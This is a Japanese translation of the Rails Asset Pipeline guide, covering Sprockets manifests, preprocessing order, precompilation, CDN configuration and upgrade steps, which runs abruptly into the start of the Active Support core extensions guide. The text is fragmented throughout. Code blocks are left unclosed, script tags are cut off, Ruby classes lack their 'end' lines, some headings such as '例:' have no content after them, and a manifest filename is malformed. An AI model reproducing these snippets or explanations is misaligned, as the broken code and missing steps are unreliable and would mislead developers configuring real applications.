Sprocketsは`config.assets.paths`で指定したパスも探索します。このパスには、標準的なアプリケーションパスと、Railsエンジンによって追加されるすべてのパスが含まれます。
必要であれば画像ファイルをサブディレクトリに置いて整理することもできます。この画像にアクセスするには、ディレクトリ名を含めて以下のようにタグで指定します。
WARNING: アセットのプリコンパイルを行っている場合 ([production環境の場合](#production環境の場合)参照)、存在しないアセットへのリンクを含むページを呼び出すと例外が発生します。
空文字へのリンクも同様に例外が発生します。
ユーザーから提供されたデータに対して`image_tag`などのヘルパーを使用する場合はご注意ください。
#### CSSとERB
アセットパイプラインは自動的にERBを評価します。
たとえば、cssアセットファイルに`erb`という拡張子を追加すると (`application.css.erb`など)、CSSルール内で`asset_path`などのヘルパーが使用できるようになります。
```css
.class { background-image: url(<%= asset_path 'image.png' %>) }
これは、指定されたアセットへのパスを記述します。
上の例では、アセット読み込みパスのいずれかにある画像ファイル (`app/assets/images/image.png`など) が指定されたと解釈されます。
この画像が既にフィンガープリント付きで`public/assets`にあれば、このパスによる参照は有効になります。
[データURIスキーム](http://ja.wikipedia.org/wiki/Data_URI_scheme) (CSSファイルにデータを直接埋め込む手法) を使用したい場合は、`asset_data_uri`を使用できます。
#logo { background: url(<%= asset_data_uri 'logo.png' %>) }
上のコードは、CSSソースに正しくフォーマットされたdata URIを挿入します。
この場合、`-%>`でタグを閉じることはできませんのでご注意ください。
#### CSSとSass
アセットパイプラインを使用する場合、最終的にアセットへのパスを変換する必要があります。このために、`sass-rails` gemは名前が`-url`や`-path`で終わる (Sass内ではハイフンですが、Rubyではアンダースコアで表します) 各種ヘルパーを提供しています。ヘルパーがサポートするアセットクラスは、画像、フォント、ビデオ、音声、JavaScript、stylesheetです。
* `image-url("rails.png")`は`url(/assets/rails.png)`に変換される
* `image-path("rails.png")`は`"/assets/rails.png"`に変換される
以下のような、より一般的な記法を使用することもできます。
* `asset-url("rails.png")`は`url(/assets/rails.png)`に変換される
* `asset-path("rails.png")`は`"/assets/rails.png"`に変換される
#### JavaScript/CoffeeScriptとERB
JavaScriptアセットに`erb`拡張子を追加すると (`application.js.erb`など)、以下のようにJavaScriptコード内で`asset_path`ヘルパーを使用できます。
$('#logo').attr({ src: "<%= asset_path('logo.png') %>" });
これは、指定されたアセットへのパスを記述します。
$('#logo').attr src: "<%= asset_path('logo.png') %>"
### マニフェストファイルとディレクティブ
Sprocketsでは、どのアセットをインクルードしてサポートするかを指定するのにマニフェストファイルを使用します。
マニフェストファイルには _ディレクティブ (directive: 命令、指示)_ を含めます。ディレクティブを使用して必要なファイルを指定し、それに基いて最終的に単一のCSSやJavaScriptファイルがビルドされます。
ファイルを連結してひとつにすることにより、ブラウザからサーバーへのリクエスト数を減らすことができ、ページの読み込み時間が大きく短縮されます。
圧縮することによってもファイルサイズが小さくなり、ブラウザへの読み込み時間が短縮されます。
新規作成したRails 4アプリケーションにはデフォルトで`app/assets/javascripts/application.js`ファイルに以下のような記述が含まれています。
// ...
//= require jquery
//= require jquery_ujs
//= require_tree .
JavaScriptのSprocketsディレクティブは`//=`で始まります。
上の例では`require`と`require_tree`というディレクティブが使用されています。
`require`は、必要なファイルをSprocketsに指定するのに使用します。
ここでは`jquery.js`と`jquery_ujs.js`を必要なファイルとして指定しています。これらのファイルはSprocketsの検索パスのどこかから読み込み可能になっています。
このディレクティブでは拡張子を明示的に指定する必要はありません。
ディレクティブが`.js`ファイルに書かれていれば、Sprocketsによって自動的に`.js`ファイルが必要ファイルとして指定されます。
`require_tree`ディレクティブは、指定されたディレクトリ以下の _すべての_ JavaScriptファイルを再帰的にインクルードし、出力に含めます。
このパスは、マニフェストファイルからの相対パスとして指定する必要があります。
`require_directory`ディレクティブを使用すると、指定されたディレクトリの直下にあるすべてのJavaScriptファイルのみをインクルードします。この場合サブディレクトリを再帰的に探索しません。
ディレクティブは記載した順に実行されますが、`require_tree`でインクルードされるファイルの読み込み順序は指定できません。
従って、特定の読み込み順に依存しないようにする必要があります。
もしどうしても特定のJavaScriptファイルを他のJavaScriptファイルよりも結合順を先にしたい場合、そのファイルへのrequireディレクティブをマニフェストの最初に置きます。
`require`および類似のディレクティブは、出力時に同じファイルを2回以上インクルードしないようになっています。
Railsは以下の行を含むデフォルトの`app/assets/stylesheets/application.css`ファイルも作成します。
/* ...
*= require_self
*= require_tree .
Rails 4は`app/assets/javascripts/application.js`と`app/assets/stylesheets/application.css`ファイルを両方作成します。これはRailsアプリケーション新規作成時に--skip-sprocketsを指定するかどうかにかかわらず行われます。
これにより、必要に応じて後からアセットパイプラインを追加することもできます。
JavaScriptで使用できるディレクティブはスタイルシートでも使用できます (なおJavaScriptと異なりスタイルシートは明示的にインクルードされるという違いがあります)。
CSSマニフェストにおける`require_tree`ディレクティブの動作はJavaScriptの場合と同様に現在のディレクトリにあるすべてのスタイルシートをrequireします。
上の例では`require_self`が使用されています。
このディレクティブは、`require_self`呼び出しが行われたその場所にCSSファイルがあれば読み込みます。
NOTE: Sassファイルを複数使用しているのであれば、Sprocketsディレクティブで読み込まずに[Sass `@import`ルール](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#import)を使用する必要があります。
このような場合にSprocketsディレクティブを使用してしまうと、Sassファイルが自分自身のスコープに置かれるため、その中で定義されている変数やミックスインが他のSassから利用できなくなってしまいます。
`@import "*"`や`@import "**/*"`などのようにワイルドカードマッチでツリー全体を指定することもできます。これは`require_tree`と同等です。
詳細および重要な警告については[sass-railsドキュメント](https://github.com/rails/sass-rails#features)を参照してください。
マニフェストファイルは必要に応じていくつでも使用できます。
たとえば、アプリケーションのadminセクションで使用するJSファイルとCSSファイルを`admin.css`と`admin.js`マニフェストにそれぞれ記載することができます。
読み込み順についても前述のとおり反映されます。
特に、個別に指定したファイルは、そのとおりの順序でコンパイルされます。
たとえば、以下では3つのCSSファイルを結合しています。
*= require reset
*= require layout
*= require chrome
### プリプロセス
適用されるプリプロセスの種類は、アセットファイルの拡張子によって決まります。
コントローラやscaffoldをデフォルトのgemセットで生成した場合、通常JavaScriptファイルやCSSファイルが置かれる場所にCoffeeScriptファイルとSCSSファイルがそれぞれ生成されます。
先の例では、コントローラ名が"projects"で、`app/assets/javascripts/projects.js.coffee`ファイルと`app/assets/stylesheets/projects.css.scss`ファイルが生成されます。
developmentモードの場合、あるいはアセットパイプラインが無効になっている場合は、これらのアセットへのリクエストは`coffee-script` gemと`sass` gemが提供するプロセッサによって処理され、それぞれJavaScriptとCSSとしてブラウザへのレスポンスが送信されます。
アセットパイプラインが有効になっている場合は、これらのアセットファイルはプリプロセスの対象となり、処理後のファイルが`public/assets`ディレクトリに置かれてRailsアプリケーションまたはWebサーバーによって利用されます。
アセットファイル名に別の拡張子を追加することにより、プリプロセス時に別のレイヤを追加でリクエストすることができます。アセットファイル名の拡張子は、「右から左」の順に処理されます。
従って、アセットファイル名の拡張子は、これに従って処理を行うべき順序で与える必要があります。
たとえば、`app/assets/stylesheets/projects.css.scss.erb`というスタイルシートでは、最初にERBとして処理され、続いてSCSS、最後にCSSとして処理されます。同様にして、 `app/assets/javascripts/projects.js.coffee.erb` というJavaScriptファイルの場合では、ERB → CoffeeScript → JavaScript の順に処理されます。
このプリプロセス順序は非常に重要ですので、心に留めておいてください。
たとえば、仮に`app/assets/javascripts/projects.js.erb.coffee`というファイルを呼び出すと、最初にCoffeeScriptインタプリタによって処理されます。しかしこれは次のERBで処理できないので問題が発生することがあります。
development環境の場合
developmentモードの場合、アセットは個別のファイルとして、マニフェストファイルの記載順に読み込まれます。
`app/assets/javascripts/application.js`というマニフェストの内容が以下のようになっているとします。
//= require core
//= require projects
//= require tickets
上によって以下のHTMLが生成されます。
<script src="/assets/core.js?
<script src="/assets/projects.js?
<script src="/assets/tickets.js?
`body`パラメータはSprocketsで必要となります。
### ランタイムエラーをチェックする
アセットパイプラインはdevelopmentモードでランタイム時のエラーをデフォルトでチェックします。
この動作を無効にするには、以下の設定を使用します。
config.assets.raise_runtime_errors = false
このオプションがtrueになっていると、アプリケーションのアセットが`config.assets.precompile`に記載されているとおりにすべて読み込まれているかどうかをチェックします。
`config.assets.digest`もtrueになっている場合、アセットへのリクエストにダイジェストを含むことが必須となります。
### ダイジェストをオフにする
`config/environments/development.rb`を更新して以下のようにすることで、ダイジェストをオフにできます。
config.assets.digest = false
このオプションがtrueになっていると、ダイジェストが生成されてアセットへのURLに含まれるようになります。
### デバッグをオフにする
デバッグモードをオフにするには、`config/environments/development.rb`に以下を追記します。
config.assets.debug = false
デバッグモードをオフにすると、Sprocketsはすべてのファイルを結合して、必要なプリプロセッサを実行します。
デバッグモードをオフにすると、上のマニフェストファイルによって以下が生成されるようになります。
<script src="/assets/application.js"></script> 
アセットは、サーバー起動後に最初にリクエストを受け取った時点でコンパイルとキャッシュが行われます。
Sprocketsは、`must-revalidate`というCache-Control HTTPヘッダを設定することで、以後のリクエストのオーバーヘッドを減らします。この場合、ブラウザはレスポンス304 (Not Modified) を受け取ります。
リクエストとリクエストの合間に、マニフェストに記載されているファイルのいずれかで変更が生じた場合、Railsサーバーは新しくコンパイルされたファイルをレスポンスで返します。
Railsのヘルパーメソッドを使用してデバッグモードをオンにすることもできます。
<%= stylesheet_link_tag "application", debug: true %>
<%= javascript_include_tag "application", debug: true %>
デバッグモードが既にオンの場合、`:debug`オプションは冗長です。
production環境の場合
Sprocketsは、production環境では前述のフィンガープリントによるスキームを使用します。
デフォルトでは、Railsのアセットはプリコンパイル済みかつ静的なアセットとしてWebサーバーから提供されることが前提になっています。
MD5はコンパイルされるファイルの内容を元にプリコンパイル中に生成され、ファイル名に挿入されてディスクに保存されます。
マニフェスト名はRailsヘルパーによってこれらのフィンガープリント名と置き換えられて使用されます。
以下の例で説明します。
<%= stylesheet_link_tag "application" %>
上のコードによって以下のような感じで生成されます。
<script src="/assets/application-908e25f4bf641868d8683022a5b62f54.js"></script>
<link href="/assets/application-4dd5b109ee3439da54f5bdfd78a80473.css" media="screen" rel="stylesheet" />
NOTE: アセットパイプラインの:cacheオプションと:concatオプションは廃止されました。これらのオプションは`javascript_include_tag`と`stylesheet_link_tag`から削除してください。
フィンガープリントの振る舞いについては`config.assets.digest`初期化オプションで制御できます。productionモードではデフォルトで`true`、それ以外では`false`です。
NOTE: デフォルトの`config.assets.digest`オプションは、通常は変更しないでください。
ファイル名にダイジェストが含まれないと、遠い将来にヘッダが設定されたときに (ブラウザなどの) リモートクライアントがファイルの内容変更を検出して再度取得することができなくなってしまいます。
### アセットをプリコンパイルする
コンパイルされたアセットは、`config.assets.prefix`で指定された場所に保存されます。
この保存場所は、デフォルトでは`/assets`ディレクトリです。
ローカル環境でコンパイルする方法については次のセクションを参照してください。
`Capfile`に以下を追加します。
load 'deploy/assets'
これにより、`config.assets.prefix`で指定されたフォルダが`shared/assets`にリンクされます。
既にこの共有フォルダを使用しているのであれば、独自のデプロイ用タスクを作成する必要があります。
このフォルダは、複数のデプロイによって共有されている点が重要です。これは、サーバー以外の離れた場所でキャッシュされているページが古いコンパイル済みアセットを参照している場合でも、キャッシュ済みページの寿命が来て削除されるまではその古いページへの参照が有効になるようにするためです。
ファイルをコンパイルする際のデフォルトのマッチャによって、`app/assets`フォルダ以下の`application.js`、`application.css`、およびすべての非JS/CSSファイル (これにより画像ファイルもすべて自動的にインクルードされます) がインクルードされます。`app/assets`フォルダにあるgemも含まれます。
[ Proc.new { |filename, path| path =~ /app\/assets/ && !
%w(.js .css).include?(
File.extname(filename)) },
/application.(css|js)$/ ]
NOTE: このマッチャ (および後述するプリコンパイル配列の他のメンバ) が適用されるのは、コンパイル前やコンパイル中のファイル名ではなく、コンパイル後の最終的なファイル名である点にご注意ください。
これは、コンパイルされてJavaScriptやCSSになるような中間ファイルはマッチャの対象からすべて除外されるということです (純粋なJavaScript/CSSと同様)。たとえば、`.coffee`と`.scss`ファイルはコンパイル後にそれぞれJavaScriptとCSSになるので、これらは自動的にはインクルードされません。
他のマニフェストや、個別のスタイルシート/JavaScriptファイルをインクルードしたい場合は、`config/initializers/assets.rb`の`precompile`という配列を使用します。
Rails.application.config.assets.precompile += ['admin.js', 'admin.css', 'swfObject.js']
NOTE: プリコンパイル配列にSassやCoffeeScriptファイルなどを追加する場合にも、必ず.jsや.cssで終わるファイル名 (つまりコンパイル後のファイル名として期待されているファイル名) も指定してください。
Railsヘルパーはこれを使用して、マッピングリクエストがSprocketsへ戻されることを回避します。
典型的なマニフェストファイルの内容は以下のような感じになっています。
{"files":{"application-723d1be6cc741a3aabb1cec24276d681.js":{"logical_path":"application.js","mtime":"2013-07-26T22:55:03-07:00","size":302506,
"digest":"723d1be6cc741a3aabb1cec24276d681"},"application-12b3c7dd74d2e9df37e7cbb1efa76a6d.css":{"logical_path":"application.css","mtime":"2013-07-26T22:54:54-07:00","size":1560,
"digest":"12b3c7dd74d2e9df37e7cbb1efa76a6d"},"application-1c5752789588ac18d7e1a50b1f0fd4c2.css":{"logical_path":"application.css","mtime":"2013-07-26T22:56:17-07:00","size":1591,
"digest":"1c5752789588ac18d7e1a50b1f0fd4c2"},"favicon-a9c641bf2b81f0476e876f7c5e375969.ico":{"logical_path":"favicon.ico","mtime":"2013-07-26T23:00:10-07:00","size":1406,
"digest":"a9c641bf2b81f0476e876f7c5e375969"},"my_image-231a680f23887d9dd70710ea5efd3c62.png":{"logical_path":"my_image.png","mtime":"2013-07-26T23:00:27-07:00","size":6646,
"digest":"231a680f23887d9dd70710ea5efd3c62"}},"assets":{"application.js":
"application-723d1be6cc741a3aabb1cec24276d681.js","application.css":
"application-1c5752789588ac18d7e1a50b1f0fd4c2.css",
"favicon.ico":"favicona9c641bf2b81f0476e876f7c5e375969.ico","my_image.png":
"my_image-231a680f23887d9dd70710ea5efd3c62.png"}}
マニフェストのデフォルトの置き場所は、`config.assets.prefix`で指定された場所のルートディレクトリ (デフォルトでは'/assets') です。
NOTE: productionモードで見つからないプリコンパイル済みファイルがあると、見つからないファイル名をエラーメッセージに含んだ`Sprockets::Helpers::RailsHelper::AssetPaths::AssetNotPrecompiledError`が発生します。
#### 遠い将来に期限切れになるヘッダー
プリコンパイル済みのアセットはファイルシステム上に置かれ、Webサーバーから直接クライアントに提供されます。
これらプリコンパイル済みアセットには、いわゆる遠い将来に期限切れになるヘッダ (far-future headers) はデフォルトでは含まれていません。したがって、フィンガープリントのメリットを得るためには、サーバーの設定を更新してこのヘッダを含める必要があります。
Apacheの設定:
```apache
# Expires* ディレクティブを使用する場合はApacheの
# `mod_expires`モジュールを有効にする必要あり
<Location /assets/>
  # Last-Modifiedフィールドが存在する場合はETagの使用が妨げられる
  Header unset ETag
  FileETag None
  # RFCによるとキャッシュは最長1年まで
  ExpiresActive On
  ExpiresDefault "access plus 1 year"
NGINXの場合:
```nginx
location ~ ^/assets/ {
  expires 1y;
  add_header Cache-Control public;
  add_header ETag "";
  break;
### ローカルでプリコンパイルを行なう
アセットをローカルでプリコンパイルする理由はいくつか考えられます。
たとえば以下のようなものがあります。
* production環境のファイルシステムへの書き込み権限がない。
* デプロイ先が複数あり、同じ作業を繰り返したくない。
* アセットの変更を伴わないデプロイが頻繁に発生する。
ローカルでのコンパイルを行なうことで、コンパイル済みのアセットファイルをGitなどによるソース管理対象に含め、他のファイルと一緒にデプロイできるようになります。
ただし、以下の3つの注意点があります。
* Capistranoのデプロイメントタスクでアセットのプリコンパイルを行わないこと。
* development環境で圧縮機能や最小化機能がすべて利用できるようにしておくこと。
* 以下のアプリケーション設定を変更しておくこと。
`config/environments/development.rb`に以下の行があります。
config.assets.prefix = "/dev-assets"
`prefix`を変更すると、Sprocketsはdevelopmentモードで別のURLを使用してアセットを提供し、すべてのリクエストがSprocketsに渡されるようになります。
production環境のプレフィックスは`/assets`のままです。
この変更を行わなかった場合、アプリケーションはdevelopment環境でもproduction環境と同じ`/assets`からプリコンパイルしたアセットを提供します。この場合、アセットを再コンパイルしないとローカルでの変更が反映されません。
実用上は、この変更によってローカルでのプリコンパイルが行えるようになり、必要に応じてそれらのファイルをワーキングツリーに追加してソース管理にコミットできるようになります。
developmentモードは期待どおり動作します。
### 動的コンパイル
状況によっては動的コンパイル (live compilation) を使用したいこともあるでしょう。
このモードでは、パイプラインのアセットへのリクエストは直接Sprocketsによって扱われます。
このオプションを有効にするには以下を設定します。
config.assets.compile = true
最初のリクエストを受けると、アセットは上述のdevelopment環境のところで説明したとおりにコンパイルおよびキャッシュされます。ヘルパーで使用されるマニフェスト名にはMD5ハッシュが含まれます。
また、Sprocketsは`Cache-Control` HTTPヘッダーを`max-age=31536000`に変更します。
このヘッダーは、サーバーとクライアントブラウザの間にあるすべてのキャッシュ (プロキシなど) に対して、サーバーが提供するこのコンテンツは1年間キャッシュしてよいと通知します。
これにより、そのサーバーのアセットに対するリクエスト数を減らすことができ、アセットをローカルブラウザのキャッシュやその他の中間キャッシュで代替するよい機会が与えられます。
このモードはデフォルトよりもメモリを余分に消費し、パフォーマンスも落ちるためお勧めできません。
本番アプリケーションのデプロイ先のシステムに既存のJavaScriptランタイムがない場合は、以下をGemfileに記述します。
group :production do
  gem 'therubyracer'
### CDN
CDN ([コンテンツデリバリーネットワーク](http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%83%87%E3%83%AA%E3%83%90%E3%83%AA%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF))は、全世界を対象としてアセットをキャッシュすることを主な目的として設計されています。それにより、ブラウザからアセットをリクエストすると、ネットワーク上で最も近くにあるキャッシュのコピーが使用されます。
production環境のRailsサーバーから (中間キャッシュを使用せずに) 直接アセットを提供しているのであれば、アプリケーションとブラウザの間でCDNを使用するのがベストプラクティスです。
CDNの典型的な利用法は、productionサーバーを "origin" サーバーとして設定することです。
つまり、ブラウザがCDN上のアセットをリクエストしてキャッシュが見つからない場合、オンデマンドでサーバーからアセットファイルを取得してキャッシュするということで
CDN上の同じURLに対して次のリクエストが発生すると、キャッシュされたコピーがヒットします。
CDNがアセットを直接提供する場合、ブラウザからのリクエストが直接Railsサーバーに達することはありません。
CDNが提供するアセットはネットワーク上でブラウザに近い位置にあるので、リクエストは高速化されます。また、サーバーはアセットの送信に使う時間を節約できるので、アプリケーション本来のコードをより高速で提供することに集中できます。
#### CDNで静的なアセットを提供する
CDNを設定するには、Railsアプリケーションがインターネット上でproductionモードで運用されており、`example.com`などのように誰でもアクセスできるURLがある必要があります。
続いて、クラウドホスティングプロバイダーが提供するCDNサービスと契約を結ぶ必要もあります。
その際、CDNの"origin"設定をRailsアプリケーションのWebサイト`example.com`にする必要もあります。originサーバーの設定方法のドキュメントについてはプロバイダーにお問い合わせください。
サービスに使用するCDNから、アプリケーションで使用するためのカスタムサブドメイン (例: `mycdnsubdomain.fictional-cdn.com`) を交付してもらう必要もあります (メモ: fictional-cdn.comは説明用であり、少なくとも執筆時点では本当のCDNプロバイダーではありません)。
以上でCDNサーバーの設定が終わりましたので、今度はブラウザに対して、Railsサーバーに直接アクセスするのではなく、CDNからアセットを取得するように通知する必要があります。
これを行なうには、従来の相対パスに代えてCDNをアセットのホストサーバーとするようRailsを設定します。
Railsでアセットホストを設定するには、`config/production.rb`の`config.action_controller.asset_host`を以下のように設定します。
config.action_controller.asset_host = 'mycdnsubdomain.fictional-cdn.com'
NOTE: ここに記述するのは "ホスト名" (サブドメインとルートドメインを合わせたもの) のみです。`http://`や`https://`などのプロトコルスキームを記述する必要はありません。
アセットへのリンクで使用されるプロトコルスキームは、Webページヘのリクエスト発生時に、そのページへのデフォルトのアクセス方法に合わせて適切に生成されます。
この値は[環境変数](http://ja.wikipedia.org/wiki/%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0)で設定することもできます。これを使用すると、ステージングサーバー (訳注: 検証用に本番サーバーを複製したサーバー) の実行が楽になります。
config.action_controller.asset_host = ENV['CDN_HOST']
サーバーとCDNの設定完了後、以下のアセットを持つWebページにアクセスしたとします。
<%= asset_path('smile.png') %>
上の例では、`/assets/smile.png`のようなパスは返されません (読みやすくするためダイジェスト文字は省略してあります)。
実際に生成されるCDNへのフルパスは以下のようになります。
http://mycdnsubdomain.fictional-cdn.com/assets/smile.png
ファイルのコピーがCDNにない場合、CDNは "origin" (この場合`example.com/assets/smile.png`) を探して今後のために保存しておきます。
CDNで扱うアセットを一部だけに限っておきたい場合、アセットヘルパーのカスタム`:host`オプションを使用して`config.action_controller.asset_host`の値セットを上書きすることもできます。
<%= asset_path 'image.png', host: 'mycdnsubdomain.fictional-cdn.com' %>
#### CDNのキャッシュの動作をカスタマイズする
CDNはコンテンツをキャッシュすることで動作します。
CDNに保存されているコンテンツが古くなったり壊れていたりすると、メリットよりも害の方が大きくなります。
本セクションでは、多くのCDNにおける一般的なキャッシュの動作について解説します。プロバイダによってはこの記述のとおりでないことがありますのでご注意ください。
##### CDNリクエストキャッシュ
これまでCDNがアセットをキャッシュするのに向いていると説明しましたが、実際にキャッシュされているのはアセット単体ではなくリクエスト全体です。
ヘッダーの中でもっとも重要なのは`Cache-Control`です。これはCDN (およびWebブラウザ) にキャッシュの取り扱い方法を通知するためのものです。
たとえば、誰かが実際には存在しないアセット`/assets/i-dont-exist.png`にリクエストを行い、Railsが404エラーを返したとします。このときに`Cache-Control`ヘッダーが有効になっていると、CDNはこの404エラーページをキャッシュしようとします。
##### CDNヘッダをデバッグする
このヘッダが正しくキャッシュされているかどうかを確認するひとつの方法として、[curl]( http://explainshell.com/explain?cmd=curl+-I+http%3A%2F%2Fwww.example.com)を使用するという方法があります。
curlを使用して、サーバーとCDNにそれぞれリクエストを送信し、ヘッダーが同じであるかどうかを以下のように確認できます。
HTTP/1.1 200 OK Server: Cowboy
Date: Sun, 24 Aug 2014 20:27:50 GMT
Connection: keep-alive
Last-Modified: Thu, 08 May 2014 01:24:14 GMT Content-Type: text/css
Cache-Control: public, max-age=2592000
Content-Length: 126560
Via: 1.1 vegur
今度はCDNのコピーです。
HTTP/1.1 200 OK Server: Cowboy
Content-Type: text/css
Cache-Control: public, max-age=2592000
Accept-Ranges:
bytes
Date: Sun, 24 Aug 2014 20:28:45 GMT
Via: 1.1 varnish
Age: 885814
X-Served-By: cache-dfw1828-DFW
X-Cache: HIT
X-Cache-Hits:
X-Timer: S1408912125.211638212,VS0,VE0
CDNが提供する`X-Cache`などの機能やCDNが追加するヘッダなどの付加的情報については、CDNのドキュメントを確認してください。
##### CDNとCache-Controlヘッダ
[Cache-Controlヘッダ](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9)は、リクエストがキャッシュされる方法を定めたW3Cの仕様です。
CDNを使用していない場合、ブラウザはこのヘッダ情報を使用してコンテンツをキャッシュします。
このヘッダのおかげで、アセットで変更が発生していない場合にブラウザがCSSやJavaScriptをリクエストのたびに再度ダウンロードせずに済み、非常に有用です。
アセットのCache-Controlヘッダは一般に "public" にしておくものであり、RailsサーバーはCDNやブラウザに対してこのヘッダを通じてそのことを通知します。アセットが "public" であるということは、そのリクエストをどんなキャッシュにも保存してよいということを意味します。
同様に`max-age` もこのヘッダでCDNやブラウザに通知されます。`max-age`は、キャッシュがオブジェクトを保存する期間を指定します。この期間を過ぎるとキャッシュは廃棄されます。
`max-age`の値は秒単位で指定します。最大値は`31536000`であり、これは一年に相当します。
Railsでは以下の設定でこの期間を指定できます。
例:
[YUI CSS compressor](http://yui.github.io/yuicompressor/css.html)は最小化機能を提供します (訳注: この項では、圧縮 (compress) という語は最小化 (minify) や難読化 (uglify) と同じ意味で使用されており、圧縮後のファイルはzipのようなバイナリになりません)。
Mac OS XやWindowsを使用している場合は、OSにJavaScriptランタイムをインストールしてください。
NOTE: CSSやJavaScriptの圧縮を有効にする`config.assets.compress`初期化オプションはRails 4で廃止されました。
現在はこのオプションを設定しても何も変わりません。
CSSおよびJavaScriptアセットの圧縮を制御するには、`config.assets.css_compressor`および`config.assets.js_compressor`を使用します。
### 独自の圧縮機能を使用する
CSSやJavaScriptの圧縮設定にはあらゆるオブジェクトを設定できます。
設定に与えるオブジェクトには`compress`メソッドが実装されている必要があります。このメソッドは文字列のみを引数として受け取り、圧縮結果を文字列で返す必要があります。
class Transformer
  def compress(string)
    do_something_returning_a_string(string)
上のコードを有効にするには、`application.rb`の設定オプションに新しいオブジェクトを渡します。
config.assets.css_compressor = Transformer.new
### _アセット_ のパスを変更する
デフォルトでは、Sprocketsが使用するパブリックなパスは`/assets`になります。
このパスは以下のように変更可能です。
config.assets.prefix = "/他のパス"
このオプションは次のような場合に便利です。アセットパイプラインを使用しない既存のプロジェクトがあり、そのプロジェクトの既存のパスを指定したり、別途新しいリソース用のパスを指定したりする場合なのです。
### X-Sendfileヘッダー
X-SendfileヘッダーはWebサーバーに対するディレクティブであり、アプリケーションからのレスポンスをブラウザに送信せずに破棄し、代りに別のファイルをディスクから読みだしてブラウザに送信します。
このオプションはデフォルトでは無効です。サーバーがこのヘッダーをサポートしていればオンにできます。
このオプションをオンにすると、それらのファイル送信はWebサーバーに一任され、それによって高速化されます。
この機能の使用法については[send_file](http://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file)を参照してください。
ApacheとNGINXではこのオプションがサポートされており、以下のように`config/environments/production.rb`で有効にすることができます。
# config.action_dispatch.x_sendfile_header = "X-Sendfile" # Apache用
# config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # NGINX用
WARNING: 既存のRailsアプリケーションをアップグレードする際にこの機能を使用することを検討している場合は、このオプションの貼り付け先に十分ご注意ください。このオプションを貼り付けてよいのは`production.rb`と、production環境として振る舞わせたい他の環境ファイルのみです。`application.rb`ではありません。
TIP: 詳細については、production環境用Webサーバーのドキュメントを参照してください。
- [Apache](https://tn123.org/mod_xsendfile/)
- [NGINX](http://wiki.nginx.org/XSendfile)
アセットのキャッシュストア
Railsのキャッシュストアは、Sprocketsを使用してdevelopment環境とproduction環境のアセットをキャッシュを使用します。
キャッシュストアの設定は`config.assets.cache_store`で変更できます。
config.assets.cache_store = :memory_store
アセットキャッシュストアで利用できるオプションは、アプリケーションのキャッシュストアと同じです。
config.assets.cache_store = :memory_store, { size: 32.megabytes }
アセットキャッシュストアを無効にするには以下のようにします。
config.assets.configure do |env|
  env.cache = ActiveSupport::Cache.lookup_store(:null_store)
アセットをGemに追加する
アセットはgemの形式で外部ソースから持ち込むこともできます。
そのよい例は`jquery-rails` gemです。これは標準のJavaScriptライブラリをgemとしてRailsに提供します。
このgemには`Rails::Engine`から継承したエンジンクラスが1つ含まれています。
このgemを導入することにより、Railsはこのgem用のディレクトリにアセットを配置可能であることを認識し、`app/assets`、`lib/assets`、`vendor/assets`ディレクトリがSprocketsの検索パスに追加されます。
ライブラリやGemをプリプロセッサ化する
------------------------------------------
Sprocketsは異なるテンプレートエンジンへの一般的なインターフェイスとして[Tilt](https://github.com/rtomayko/tilt)を使用するため、gemにTiltテンプレートプロトコルのみを実装するだけで済みます。
通常、Tiltを`Tilt::Template`のようにサブクラス化して`prepare`メソッドと`evaluate`メソッドを再実装します。`prepare`メソッドはテンプレートを初期化し、`evaluate`メソッドは処理の終わったソースを返します。
処理前のソースは`data`に保存されます。
module BangBang
  class Template < ::Tilt::Template
    def prepare
      # ここですべての初期化を行なう
    # 元のテンプレートに"!"を追加する
    def evaluate(scope, locals, &block)
      "#{data}!"
これで`Template`クラスができましたので、続いてテンプレートファイルの拡張子との関連付けを行います。
Sprockets.register_engine '.bang', BangBang::Template
古いバージョンのRailsからアップグレードする
Rails 3.0やRails 2.xからのアップグレードの際には、いくつかの作業を行う必要があります。
最初に、`public/`ディレクトリ以下のファイルを新しい場所に移動します。
ファイルの種類ごとの正しい置き場所については、[アセットの編成](#アセットの編成)を参照してください。
続いて、JavaScriptファイルの重複を解消します。
jQueryはRails 3.1以降におけるデフォルトのJavaScriptライブラリなので、`jquery.js`を`app/assets`に置かなくても自動的に読み込まれます。
3番目に、多くの環境設定ファイルを正しいデフォルトオプションに更新します。
`application.rb`の場合。
# アセットのバージョンを指定する。アセットをすべて期限切れにしたい場合はこの値を変更する。
# config.assets.prefix = "/assets"は、アセットの置き場所となるパスを変更する際に使用する。
`development.rb`の場合。
# アセットで読み込んだ行を展開する。
`production.rb`の場合。
# 圧縮機能を使用するには config.assets.js_compressor  = を使用する
# :uglifier config.assets.css_compressor = :yui
# アセットURLのダイジェストを生成する。
(今後非推奨になる計画あり)
# 追加のアセットをプリコンパイルする (application.js、application.css、およびすべての
# 非JS/CSSファイルが追加済み) config.assets.precompile += %w( search.js )
Rails 4はSprocketsのデフォルト設定値をtest環境用の`test.rb`に設定しなくなりました。従って、`test.rb`にSprocketsの設定を行なう必要があります。
test環境における以前のデフォルト値は、`config.assets.compile = true`、`config.assets.compress = false`、`config.assets.debug = false`、`config.assets.digest = false`です。
以下を`Gemfile`に追加する必要があります。
gem 'sass-rails',   "~> 3.2.3"
gem 'coffee-rails', "~> 3.2.1"
Active Support コア拡張機能
Active SupportはRuby on Railsのコンポーネントであり、Ruby言語の拡張、ユーティリティ、その他横断的な作業を担っています。
Active Supportは言語レベルで基本部分を底上げして豊かなものにし、Railsアプリケーションの開発とRuby on Railsそれ自体の開発に役立てるべく作られています。
* コア拡張機能について
* すべての拡張機能を読み込む方法
* 必要な拡張機能だけを利用する方法
* Active Supportが提供する拡張機能一覧
コア拡張機能を読み込む方法
### 単体のActive Supportサポート
足跡をほぼ残さないようにするため、Active Supportはデフォルトでは何も読み込みません。
Active Supportは細かく分割され、必要な拡張機能だけが読み込まれるようになっています。また、関連する拡張機能(場合によってはすべての拡張機能)も同時に読み込むのに便利なエントリポイントもあります。
従って、以下のようなrequire文を実行しただけでは
require 'active_support'
オブジェクトは`blank?`にすら応答してくれません。
